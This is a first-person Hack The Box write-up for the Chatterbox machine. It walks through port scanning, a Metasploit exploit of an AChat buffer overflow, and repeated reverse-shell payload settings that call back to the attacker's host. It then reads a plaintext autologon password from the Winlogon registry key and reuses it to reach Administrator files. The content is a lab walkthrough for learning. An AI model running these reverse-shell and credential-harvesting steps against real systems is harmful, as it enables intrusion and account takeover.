HTB Chatterbox

Hack The Box challenge: AChat buffer overflow, a command shell that finally stayed open, and Administrator access.

Reconnaissance

Let's create a dedicated assessment directory, cd into it, export our target IP as an environmental variable, and get our scan on.

mkdir chatterbox
tip=10.129.108.177
echo $tip
cd chatterbox

We'll start up Rustscan next:

rustscan -a $tip -b 5000 -r 1-65535 --exclude-ports 9999 -- -A -n -T4 --max-retries 1 --min-rate 1000 -oA chatterbox_rust_scan

We have quite a bit of information to start with. We definitely have enough to answer the first flag question, but don't let this question trick you: How many TCP ports outside of the default nmap top 1000 are listening on Chatterbox?

AChat on port 9256

The chat service on port 9256 is our next lead: What is the name of the chat service running on port 9256?

There is a known buffer overflow in this version of AChat. I want to check which UDP port the exploit uses.

Finding a shell that stays open

Just an update: I've had endless issues with the connection dying. I was able to sneak in a quick whoami before this session died:

This is ridiculous. I've reset the box, tried different available listening ports.

Every. Dang. Time. The exploit died:

The exploit code on Exploit-DB warns that it is timing-sensitive. Two AChat threads concurrently overflow, and the default is EXITFUNC=process. The Meterpreter host process keeps collapsing.

Let's test migrating before Meterpreter initializes. Exit msfconsole, then rerun msfconsole (or msfconsole -q to speed it up):

set PAYLOAD windows/meterpreter/reverse_tcp
set RHOSTS 10.129.108.212
set RPORT 9256
set LHOST 10.10.14.36
set LPORT 4444
set EXITFUNC thread
set PrependMigrate true
set PrependMigrateProc notepad.exe

PrependMigrate will move the payload into a new process before the Meterpreter session starts and before AutoRunScript, which depends on Meterpreter and its extensions initializing. If execution returns, EXITFUNC thread avoids intentionally terminating the entire AChat process.

show advanced
run

Alrighty. Let's run this.

And it failed again.

Let's do a post-session migration:

set PrependMigrate false
set EXITFUNC thread
set AutoRunScript post/windows/manage/migrate SPAWN=true
run

Progress, but still not connecting to the target.

Let's test the timing and see if it helps:

set WfsDelay 15
run

The session dies before AutoRunScript starts, so the normal autorun hook is too late.

I'm restarting this box once more. After it's done restarting, we'll put these configs into msfconsole:

set RHOSTS 10.129.108.218
unset AutoRunScript
set InitialAutoRunScript migrate -f
set PrependMigrate false
set EXITFUNC thread
set WfsDelay 15
run

I swear this machine is designed to test patience and ingenuity. Fine. I'll tango.

We'll run a staged command shell, effectively completely avoiding Meterpreter's extension/bootstrap:

unset InitialAutoRunScript
unset AutoRunScript
set PAYLOAD windows/shell/reverse_tcp
set RHOSTS 10.129.108.218
set LHOST 10.10.14.36
set LPORT 4444
set EXITFUNC thread
set WfsDelay 15
run

Alfred and Administrator

Let's move into Alfred's profile:

cd /d C:\Users\Alfred
dir /a

Now we can start looking for the user flag in reasonable places:

dir Desktop
type Desktop\user.txt

Moving on.

whoami /priv
cmdkey /list

Alfred has regular ole' user privileges. Credential Manager beholds no usable credentials.

This box throws strong hints by way of the flag questions that the Administrator password is stored as a config secret.

Let's test my hypothesis:

reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" | findstr /i "DefaultUserName DefaultPassword"

Score. A plaintext logon credential. If password reuse isn't intended here, I'll eat my words.

Let's test the password against the Administrator account in a way that avoids fighting with runas inside a non-interactive reverse shell:

net use \\127.0.0.1\IPC$ /user:Administrator Welcome1!

Not eating my words today. We have our Admin password.

Let's use the same authenticated connection process to grab the Administrator flag:

type \\127.0.0.1\c$\Users\Administrator\Desktop\root.txt

I can't believe how much time I just spent on Metasploit configs. Lesson learned.
